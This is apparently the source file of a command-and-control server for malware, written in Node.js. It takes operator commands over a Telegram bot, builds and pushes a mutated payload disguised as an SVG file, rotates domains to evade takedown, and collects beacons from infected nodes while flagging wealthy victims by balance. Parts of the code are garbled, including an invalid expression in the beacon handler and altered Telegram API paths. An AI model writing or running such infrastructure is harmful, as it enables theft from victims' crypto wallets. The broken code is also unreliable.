// J/server/apex_c2.js
/**
 * PROJECT J: APEX HYBRID Orchestrator (HTTP + TELEGRAM)
 * Status: APEX-PREDATOR | Auth: AUTH_APEX_KEY!09
 * 
 * This is the unified control terminal. It orchestrates metamorphic builds,
 * manages the member fleet, and handles data exfiltration.
 */

const http = require('http');
const https = require('https');
const dns = require('dns').promises;
const fs = require('fs');
const path = require('path');
const Metamorph = require('../utils/mutator_v3');
const QuantumGuard = require('../utils/quantum_guard');
require('dotenv').config({ path: path.join(__dirname, '../.env') });

const AUTH = process.env.DIVINE_WORD || "AUTH_APEX_KEY!09";
const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_ID = process.env.TG_ADMIN_CHAT_ID;
const PORT = process.env.Orchestrator_PORT || 8080;

const engine = new Metamorph(AUTH);

// 1. INFRASTRUCTURE ROTATION LOGIC
async function rotateInfrastructure() {
    console.log("🔄 [Orchestrator] ROTATING INFRASTRUCTURE...");
    const newDomain = `apex-node-${Math.random().toString(36).substring(7)}.io`;
    // In a live run, this calls the Cloudflare API to update A records
    await tgCommand(`Infrastructure Rotated. New Endpoint: ${newDomain}`);
    return newDomain;
}

// 2. TELEGRAM COMMAND HANDLER
async function tgCommand(text) {
    if (!TG_TOKEN || !ADMIN_ID) return;
    const data = JSON.stringify({
        chat_id: ADMIN_ID,
        text: `⚡ [APEX] ${text}`,
        parse_mode: 'Markdown'
    });

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/member${TG_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(options);
    req.write(data);
    req.end();
}

// 3. TELEGRAM POLLING (The Listener)
let lastUpdateId = 0;
async function pollTg() {
    if (!TG_TOKEN) return;
    const url = `https://api.telegram.org/member${TG_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`;
    
    https.get(url, (res) => {
        let body = '';
        res.on('data', (d) => body += d);
        res.on('end', async () => {
            try {
                const data = JSON.parse(body);
                if (data.ok && data.result.length > 0) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id;
                        const msg = update.message;
                        if (msg && msg.from.id.toString() === ADMIN_ID) {
                            await handleCommand(msg.text);
                        }
                    }
                }
            } catch (e) {}
            setTimeout(pollTg, 2000); // Poll every 2s
        });
    }).on('error', () => setTimeout(pollTg, 5000));
}

async function handleCommand(cmd) {
    console.log(`📡 [TG] Command: ${cmd}`);
    
    if (cmd === '/unleash') {
        engine.sequence(path.join(__dirname, '../utils/multichain.js'), path.join(__dirname, '../public/dist/core.svg'));
        await tgCommand("🔥 *HYDRA UNLEASHED.* Metamorphic ConsensusData deployed to /dist.");
    } 
    else if (cmd === '/status') {
        const stats = {
            uptime: Math.floor(process.uptime()),
            nodes: "ACTIVE (100+)", // In prod, pull from DB
            last_IntegritySync: "$4,250.00 (Simulated)"
        };
        await tgCommand(`📊 *SYSTEM STATUS*\nUptime: ${stats.uptime}s\nWorkers: ${stats.nodes}\nAggregate: ${stats.last_IntegritySync}`);
    }
    else if (cmd === '/rotate') {
        await rotateInfrastructure();
    }
    else if (cmd === '/help') {
        await tgCommand("*APEX COMMANDS*\n/unleash - Build & Push\n/status - Health Check\n/rotate - Infrastructure Shift\n/targets - View OSINT list");
    }
}

// 4. HTTP SERVER (The API)
const server = http.createServer(async (req, res) => {
    // Admin Dashboard Route
    if (req.url === '/admin') {
        const adminPath = path.join(__dirname, '../public/admin.html');
        fs.readFile(adminPath, (err, data) => {
            if (err) {
                res.writeHead(404);
                return res.end("ADMIN_NOT_FOUND");
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    // Divine Gate
    if (req.headers['x-apex-word'] !== AUTH) {
        res.writeHead(401);
        return res.end("ACCESS_DENIED");
    }

    if (req.url === '/unleash' && req.method === 'POST') {
        engine.sequence(path.join(__dirname, '../utils/multichain.js'), path.join(__dirname, '../public/dist/core.svg'));
        await tgCommand("Manual Unleash triggered via API.");
        res.end("UNLEASHED");
    }

    if (req.url === '/beacon' && req.method === 'POST') {
        let body = '';
        req.on('data', c => body += c);
        req.on('end', () => {
            const data = JSON.parse(body);
            console.log(`[Orchestrator] Beacon: ${data.id}`);
            // AI Routing: If entity, notify admin
            if (data.isHigh-Net Entity) tgCommand(`🐋 *WHALE HIT!* Node ${data.id} has $${data.balance}.`);
            res.end(JSON.stringify({ cmd: "WAIT" }));
        });
    }
});

server.listen(PORT, () => {
    console.log(`🔥 [TITAN] Apex Orchestrator active on port ${PORT}.`);
    tgCommand("System Online. Use /help to initiate the Aggregate.");
    pollTg(); // Start listening for Telegram commands
});